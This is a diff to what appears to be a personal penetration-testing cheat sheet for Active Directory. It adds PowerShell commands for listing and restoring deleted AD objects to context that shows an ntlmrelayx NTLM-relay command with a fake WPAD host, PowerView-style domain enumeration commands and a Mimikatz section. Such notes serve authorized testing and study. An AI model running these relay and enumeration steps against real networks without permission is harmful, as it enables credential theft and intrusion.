@@ -19,7 +19,7 @@ sudo ntlmrelayx.py -6 -t ldaps://192.168.1.121 -wh fakewpad.marvel.local -l loot
 ```
 
 ## Enumeration
-### Powershell
+### Powershell (from OSCP)
 ```
 Get-NetDomain
 Get-DomainPolicy
@@ -39,6 +39,14 @@ Get-LastLoggedOn -ComputerName CLient
 Invoke-ShareFinder
 ```
 https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf
+
+### Powershell (personal lisit)
+View and maybe bring back the deleted account
+```
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+Get-ADObject -IncludeDeletedObjects -Identity f0cc344d-31e0-4866-bceb-a842791ca059 -Properties *
+Restore-ADObject -Identity f0cc344d-31e0-4866-bceb-a842791ca059
+```
 
 ### Mimikatz
 ```
